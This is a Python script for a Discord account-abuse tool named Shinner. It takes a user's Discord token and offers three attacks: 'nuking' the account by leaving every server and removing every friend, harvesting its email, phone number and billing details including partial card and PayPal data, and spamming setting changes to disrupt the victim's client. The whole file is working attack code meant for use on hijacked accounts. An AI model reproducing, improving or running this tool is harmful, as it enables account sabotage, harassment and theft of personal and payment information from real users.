import threading
import requests
import discord
import random
import time
import os
import pypresence

from pypresence import Presence
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

client_id = '760339869980557322'
RPC = Presence(client_id)
RPC.connect()
RPC.update(details="Playing with accounts.", state="cood1n.github.io", large_image="trans", start=int(round(time.time() * 1000)),)

init(convert=True)
guildsIds = []
friendsIds = []
os.system('title Shinner ^| cood1n.github.io')
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            print(f" Invalid token.")
            input(" Press enter to return.")
            clear()
            startMenu()

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            billing_info = []
            for x in requests.get(
                        "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                        headers=headers,
                    ).json():
                        y = x["billing_address"]
                        name = y["name"]
                        address_1 = y["line_1"]
                        address_2 = y["line_2"]
                        city = y["city"]
                        postal_code = y["postal_code"]
                        state = y["state"]
                        country = y["country"]

                        ### Check if billing = CC or PP
                        if x["type"] == 1:
                            cc_brand = x["brand"]
                            cc_first = cc_digits.get(cc_brand)
                            cc_last = x["last_4"]
                            cc_month = str(x["expires_month"])
                            cc_year = str(x["expires_year"])

                            data = {
                                f"[{Fore.RED}CC Holder Name:{Fore.WHITE}]         ": name,
                                f"[{Fore.RED}CC Brand:{Fore.WHITE}]               ": cc_brand.title(),
                                f"[{Fore.RED}CC Number:{Fore.WHITE}]              ": "".join(
                                    z if (i + 1) % 2 else z + " "
                                    for i, z in enumerate(
                                        (cc_first if cc_first else "*")
                                        + ("*" * 11)
                                        + cc_last
                                    )
                                ),
                                f"[{Fore.RED}CC Expiry Date:{Fore.WHITE}] ": (
                                    "0" + cc_month if len(cc_month) < 2 else cc_month
                                )
                                + "/"
                                + cc_year[2:4],
                                f"[{Fore.RED}Address:{Fore.WHITE}]                ": address_1,
                                f"[{Fore.RED}Address:{Fore.WHITE}]                ": address_2 if address_2 else "",
                                f"[{Fore.RED}City:{Fore.WHITE}]                   ": city,
                                f"[{Fore.RED}Postal Code / Zip Code:{Fore.WHITE}] ": postal_code,
                                f"[{Fore.RED}State/Province:{Fore.WHITE}]         ": state if state else "",
                                f"[{Fore.RED}Country:{Fore.WHITE}]                ": country,
                                f"[{Fore.RED}Default Payment Method:{Fore.WHITE}] ": x["default"],
                            }

                        elif x["type"] == 2:
                            data = {
                                f"[{Fore.RED}PayPal Name:{Fore.WHITE}]            ": name,
                                f"[{Fore.RED}PayPal Email:{Fore.WHITE}]           ": x["email"],
                                f"[{Fore.RED}Address:{Fore.WHITE}]                ": address_1,
                                f"[{Fore.RED}Address:{Fore.WHITE}]                ": address_2 if address_2 else "",
                                f"[{Fore.RED}City:{Fore.WHITE}]                   ": city,
                                f"[{Fore.RED}Postal / Zip Code:{Fore.WHITE}]      ": postal_code,
                                f"[{Fore.RED}State/Province:{Fore.WHITE}]         ": state if state else "",
                                f"[{Fore.RED}Country:{Fore.WHITE}]                ": country,
                                f"[{Fore.RED}Default Payment Method:{Fore.WHITE}] ": x["default"],
                            }
                        billing_info.append(data)

            print(f'''
 [{Fore.RED}User ID:{Fore.RESET}]                {userID}
 [{Fore.RED}Username:{Fore.RESET}]               {userName}
 [{Fore.RED}2FA?{Fore.RESET}]                    {mfa}
''' + f'''
 [{Fore.RED}Email:{Fore.RESET}]                  {email}
 [{Fore.RED}Phone Number:{Fore.RESET}]           {phone if phone else "N/A"}
 [{Fore.RED}Token:{Fore.RESET}]                  {token}
 ''')
    if len(billing_info) > 0:
        if len(billing_info) == 1:
            for x in billing_info:
                for key, val in x.items():
                    if not val:
                        continue
                    print(Fore.RESET + ' {:<23}{}{}'.format(key, Fore.WHITE, val))
        else:
            for i, x in enumerate(billing_info):
                title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                print(' ' + title)
                print(' ' + ('=' * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j == 0:
                        continue
                    print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.RED, val))
                if i < len(billing_info) - 1:
                    print(f'{Fore.RESET}\n')
                    print(f'{Fore.RESET}\n')
        input("\n Press enter to return.")
        clear()
        startMenu()            
    else:
        print(f" [{Fore.RED}Default Payment Method:{Fore.WHITE}] N/A")
        input("\n Press enter to return.")
        clear()
        startMenu()
            
def tokenFuck(token):
    headers = {'Authorization': token}
    print(f" [{Fore.RED}NUKER{Fore.RESET}] Starting...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)
        print(f" {Fore.RESET}[{Fore.YELLOW}NUKER{Fore.RESET}] Left server. ID: {guild}")

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
        print(f" {Fore.RESET}[{Fore.YELLOW}NUKER{Fore.RESET}] Removed friend. ID: {friend}")

    for i in range(1):
        payload = {'name': f'Shinner | madebyzuoa.github.io', 'region': 'us-east', 'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)

    print(f" {Fore.RESET}[{Fore.GREEN}NUKER{Fore.RESET}] Nuking complete.")
    input(" Press enter to return.")
    clear()
    startMenu()

def seizure(token):
    headers = {'Authorization': token}
    print(f" [{Fore.YELLOW}CRASHER{Fore.RESET}] Crasher is now running. Restart the tool to stop it.")
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

def getBanner():
    banner = f'''{Fore.RED}    
                                                                 
  @@@@@@   @@@  @@@  @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
 @@@@@@@   @@@  @@@  @@@  @@@@ @@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  
 !@@       @@!  @@@  @@!  @@!@!@@@  @@!@!@@@  @@!       @@!  @@@  
 !@!       !@!  @!@  !@!  !@!!@!@!  !@!!@!@!  !@!       !@!  @!@  
 !!@@!!    @!@!@!@!  !!@  @!@ !!@!  @!@ !!@!  @!!!:!    @!@!!@!   
  !!@!!!   !!!@!!!!  !!!  !@!  !!!  !@!  !!!  !!!!!:    !!@!@!    
      !:!  !!:  !!!  !!:  !!:  !!!  !!:  !!!  !!:       !!: :!!   
     !:!   :!:  !:!  :!:  :!:  !:!  :!:  !:!  :!:       :!:  !:!  
 :::: ::   ::   :::   ::   ::   ::   ::   ::   :: ::::  ::   :::  
 :: : :     :   : :  :    ::    :   ::    :   : :: ::    :   : :  
                                                                          
         c  o  o  d  1  n  .  g  i  t  h  u  b  .  i  o

 {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Nuke account.
 [{Fore.RED}2{Fore.RESET}] Fetch account information.
 [{Fore.RED}3{Fore.RESET}] Crash account's client.
'''
    return banner

def startMenu():
    print(getBanner())
    print(f' > ', end=''); choice = str(input(''))
    
    if choice == '1':
        clear()
        print(f'{Fore.RED} Enter a token.\n{Fore.RESET} > ', end=''); token = input('')
        print(f'{Fore.RED} Enter an amount of Threads you wish to use.\n{Fore.RESET} > ', end=''); threads = input('')
        clear()
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        clear()
        print(f'{Fore.RED} Enter a token.\n{Fore.RESET} > ', end=''); token = input('')
        clear()
        tokenInfo(token)

    elif choice == '3':
        clear()
        print(f'{Fore.RED} Enter a token.\n{Fore.RESET} > ', end=''); token = input('')
        clear()
        seizure(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()
        
if __name__ == '__main__':
    startMenu()
